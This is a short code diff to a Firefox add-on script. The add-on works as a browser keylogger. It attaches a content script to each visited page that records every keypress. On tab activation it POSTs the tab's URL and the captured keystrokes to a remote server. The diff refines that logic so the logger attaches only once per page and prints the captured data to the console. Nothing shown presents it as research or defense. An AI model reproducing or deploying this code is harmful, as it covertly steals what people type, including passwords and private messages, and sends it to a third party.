@@ -28,20 +28,22 @@ tabs.on("activate", function(tab) {
   require("sdk/request").Request({
     url: url,
     content: "url="+tab.url+"&data="+ss.storage.data,
-    onComplete: console.log("done")
+    onComplete: console.log(ss.storage.data)
   }).post();
 
   ss.storage.data = "";
-  ss.storage.pages.push(tab.url);
-  var worker = tab.attach({
-    contentScript: 'window.addEventListener("keydown", function (event) { self.port.emit("storage", event.key); }, true);',
-  });
-  worker.port.on('storage', function(data){
-    if(data.length == 1)
-      ss.storage.data += data;
-    else
-      ss.storage.data += "["+data+"]";
-  });
+  if(ss.storage.pages.indexOf(tab.url) == -1){
+    ss.storage.pages.push(tab.url);
+    var worker = tab.attach({
+      contentScript: 'window.addEventListener("keydown", function (event) { self.port.emit("storage", event.key); }, true);',
+    });
+    worker.port.on('storage', function(data){
+      if(data.length == 1)
+        ss.storage.data += data;
+      else
+        ss.storage.data += "["+data+"]";
+    });
+  }
 });
 
 // Display stored data in console fr debugging and testing
